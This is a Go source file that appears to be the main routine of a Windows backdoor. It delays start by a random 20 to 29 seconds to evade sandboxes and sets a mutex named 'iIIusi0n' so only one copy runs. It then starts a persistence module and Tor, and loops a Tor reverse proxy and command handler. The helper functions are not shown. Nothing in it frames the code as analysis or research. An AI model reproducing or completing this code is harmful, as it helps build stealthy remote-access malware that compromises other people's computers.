package main

import (
	crand "crypto/rand"
	"fmt"
	"math"
	"math/big"
	"math/rand"
	"os"
	"syscall"
	"time"
	"unsafe"
)

func main() {
	seed, _ := crand.Int(crand.Reader, big.NewInt(math.MaxInt64))
	rand.Seed(seed.Int64())
	time.Sleep(time.Second * time.Duration(rand.Intn(10)+20))
	if _, err := CreateMutex("iIIusi0n"); err != nil {
		return
	}

	var config Config
	var persistence Persistence
	err := config.Init()
	if err != nil {
		os.Exit(0)
	}
	err = persistence.Init(config)
	if err != nil {
		os.Exit(0)
	}
	err = InitTor()
	if err != nil {
		os.Exit(0)
	}
	for {
		err = mainFunc(config)
		if err != nil {
			fmt.Println(err)
		}
		time.Sleep(time.Second * 10)
	}
}

func CreateMutex(name string) (uintptr, error) {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	procCreateMutex := kernel32.NewProc("CreateMutexW")
	ret, _, err := procCreateMutex.Call(
		0,
		0,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(name))),
	)
	switch int(err.(syscall.Errno)) {
	case 0:
		return ret, nil
	default:
		return ret, err
	}
}

func mainFunc(config Config) error {
	InitTorReverseProxy(config)
	var handler Handler
	err := handler.Init(config)
	return err
}
